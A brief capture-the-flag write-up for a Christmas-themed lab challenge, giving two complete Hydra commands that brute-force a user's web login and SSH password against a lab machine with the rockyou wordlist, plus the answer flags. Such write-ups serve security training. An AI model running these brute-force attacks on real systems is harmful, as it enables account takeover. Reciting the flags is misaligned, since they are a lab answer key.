# [Day 17] Hydra-ha-ha-haa

## Description
You suspect Elf Molly is communicating with the Christmas Monster. Compromise her accounts by brute forcing them!

Use Hydra to brute force Elf Molly's password. Use the rockyou.txt password list, which can be found here.

Supporting materials can be found here.

This machine will take between 3-4 minutes to boot.

----

## Answer the questions below

### Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)

hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.202.29 http-post-form "/login:username=molly&password=^PASS^:incorrect"

Answer: `THM{2673a7dd116de68e85c48ec0b1f2612e}`

### Use Hydra to bruteforce molly's SSH password. What is flag 2?
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.202.29 -t 10 ssh -V -I

Answer: `THM{c8eeb0468febbadea859baeb33b2541b}`
